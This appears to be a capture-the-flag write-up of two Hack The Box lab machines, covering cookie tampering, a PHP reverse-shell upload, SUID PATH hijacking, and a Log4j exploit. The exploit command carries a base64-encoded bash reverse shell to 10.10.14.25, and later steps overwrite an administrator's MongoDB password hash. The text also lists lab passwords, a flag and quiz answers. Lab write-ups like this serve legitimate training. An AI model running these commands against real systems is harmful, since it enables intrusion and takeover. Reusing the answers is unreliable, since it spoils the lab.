After a quick search, we find this relates to Cloudflare. Maybe there is a login page?\nhttp://10.129.28.128/cdn-cgi/login/ works!\nI tried some basic usernames and passwords, but no luck. Let’s just login as a guest for now:\nLooks like the website is using php. Also, if we change the id in the url, we are able to change the Account, Branding, and Clients tab output. My first thought was to check the cookies to see if we can’t edit something.\nCombining these ideas of the cookies and the id, I quickly unlocked the Uploads tab. I guess upload a php reverse shell.\nNow to find where this file was uploaded, and how to run it. /uploads seems like a plausible place to look (we saw this from our first scan).\nFlag is found in /home/rober/user.txt\nfile: user.txt\n1 f2c74ee8db7983851ab2a96a44eb7981 python3 -c 'import pty;pty.spawn(\"/bin/bash\")' gives us a functional shell and export TERM=xterm lets us clear the screen.\nAfter a bit of looking around, I found the www directories and went searching through that (/var/www/html/cdn-cgi/login). This lead to:\n1 2 index.php:if($_POST[\"username\"]===\"admin\" \u0026\u0026 $_POST[\"password\"]===\"MEGACORP_4dm1n!!\") index.php: file: db.php\n1 2 3 \u003c?php $conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage'); ?\u003e We can now go from www-data to robert via su robert and put in his password M3g4C0rpUs3r!\nprivesc Time for linpeas. I simply downloaded the .sh file locally, hosted it on a python server, and then downloaded it on the reverse shell.\nOn the first look through, the bugtracker group stood out - especially since there is an unknown SUID (Set owner User ID) binary called /usr/bin/bugtracker.\nltrace is a tool that allows you to run a binary and see the libraries that are being called. This will help give us a better idea of what is going on under the hood.\nltrace /usr/bin/bugtracker gives us the output:\nSince system(\"cat...\") is being run, we can simply update the $path environment variable to point to point to our own malicious cat such as a /bin/sh shell that will keep the admin privileges. Like so:\nQuestions With what kind of tool can intercept web traffic? proxy What is the path to the directory on the webserver that returns a login page? /cdn-cgi/login What can be modified in Firefox to get access to the upload page? cookie What is the access ID of the admin user? 34322 On uploading a file, what directory does that file appear in on the server? /uploads What is the file that contains the password that is shared with the robert user? db.php What executible is run with the option “-group bugtracker” to identify all files owned by the bugtracker group? find Regardless of which user starts running the bugtracker executable, what’s user privileges will use to run? root What SUID stands for?

I simply followed this walkthrough to get a reverse shell!\nlog4j (via HTB Writeup)\n“JNDI (Java Naming and Directory Interface) API . By making calls to this API, applications locate resources and other program objects. A resource is a program object that provides connections to systems, such as database servers and messaging systems.\nLDAP (Lightweight Directory Access Protocol) is an open, vendor-neutral, industry standard application protocol for accessing and maintaining distributed directory information services over the Internet or a Network. The default port that LDAP runs on is port 389.”\nImportant note: you must remove the spaces from the command listed in the above writeup in order to succesfully get a reverse shell:\njava -jar target/RogueJndi-1.1.jar --command \"bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTQuMjUvNDQ0NCAwPiYxCg==}|{base64,-d}|{bash,-i}\" --hostname \"10.10.14.25\" From here, we can easily get the user.txt\nprivesc The tutorial continues to discuss how to actually interact with mongodb in order to become an administrator and access the website. One way to do this is to update the administrator password already stored. This is done by:\nCreating a sha-512 has for our new password unified\nmkpasswd -m sha-512 unified $6$dDywalcPwNgl3LkM$Ex3SObZFkVQ5kMk4/Cmur7I9qDDKOyLNLrYbHGqt0JGz49G8fRb9KIAvFMS3AS8jGuOU/4nY5H5OtNq9/Qmpl1\nLooking through the ace database for the administrator user.\nmongo --port 27117 ace --eval \"db.admin.find().forEach(printjson);\"\nTo update administrator’s password to unified, we simply need to run:\nmongo --port 27117 ace --eval 'db.admin.update({\"_id\": ObjectId(\"61ce278f46e0fb0012d47ee4\")},{$set:{\"x_shadow\":\"$6$dDywalcPwNgl3LkM$Ex3SObZFkVQ5kMk4/Cmur7I9qDDKOyLNLrYbHGqt0JGz49G8fRb9KIAvFMS3AS8jGuOU/4nY5H5OtNq9/Qmpl1\"}})'\nBingo! administrator:unified got us in!\nAnd undersettings there’s some valubale information!\nroot:NotACrackablePassword4U2022\nThen just:\nssh root@10.129.186.136 and get the flag 😏\nQuestions Which are the first four open ports? 22,6789,8080,8443 What is title of the software that is running running on port 8443?
